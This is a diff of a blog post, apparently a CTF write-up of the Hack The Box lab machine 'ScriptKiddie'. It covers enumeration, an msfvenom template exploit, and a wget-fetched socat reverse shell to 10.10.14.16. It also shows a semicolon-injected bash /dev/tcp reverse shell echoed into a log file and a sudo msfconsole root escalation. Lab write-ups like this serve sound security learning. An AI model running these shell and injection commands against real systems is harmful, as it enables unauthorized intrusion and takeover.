@@ -1,7 +1,6 @@
 ---
 layout: post
 title: ScriptKiddie
-published: false
 ---
 
 **ScriptKiddie is an easy machine from Hack The Box.**
@@ -9,9 +8,11 @@ published: false
 ### Enumeration
 
 I'll start with a quick `nmap` scan to enumerate open ports.
+
 `nmap -sC -sV -oN nmap/basic scriptkiddie.htb`
 
 Pretty barebones machine, only ports 22 and 80 are open.
+
 ```
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
@@ -24,6 +25,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: k1d'5 h4ck3r t00l5
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 I'll run a couple `gobuster` searches in the background while I check out the webserver but I'm not going to find anything.
 
 The webpage appears to have a few different functionalities. Seems like it will run an nmap scan, create msfvenom payloads or search via searchsploit for user inputs.
@@ -42,6 +44,7 @@ Essentially, it exploits a vulnerability in `msfvenom` that will execute a paylo
 ![Pasted image 20210604102216](https://user-images.githubusercontent.com/60187707/120905729-b5b5ba80-c619-11eb-899b-de82a6a4ec47.png)
 
 I tried a few various bash reverse shells as my payload, but using `socat` was what got me onto the machine.
+
 `wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444
 `
 
@@ -61,6 +64,7 @@ I can write to `hackers` because `kid` is the owner.
 ![Pasted image 20210604121933](https://user-images.githubusercontent.com/60187707/120905840-8489ba00-c61a-11eb-9f3a-5468e8dd6589.png)
 
 So, I'll start a listener and `echo` a reverse shell into `hackers`, with a `;` at the beginning to start a new command and a `#` at the end to comment out the rest of the script.
+
 `echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/1234 0>&1' #" >> hackers`
 
 ![Pasted image 20210604122051](https://user-images.githubusercontent.com/60187707/120905898-d7fc0800-c61a-11eb-851d-4222c175fb13.png)
@@ -74,6 +78,7 @@ Run a quick `sudo -l` to check `pwn`'s permissions.
 I can run `msfconsole` as `root` without a password. Seems promising!
 
 Checking the `msfconsole` help page, I find a `-x` flag that will execute console commands. Could it be that easy?
+
 `sudo msfconsole -x su`
 
 ![Pasted image 20210604122329](https://user-images.githubusercontent.com/60187707/120905920-04178900-c61b-11eb-9dfc-d12292cab333.png)
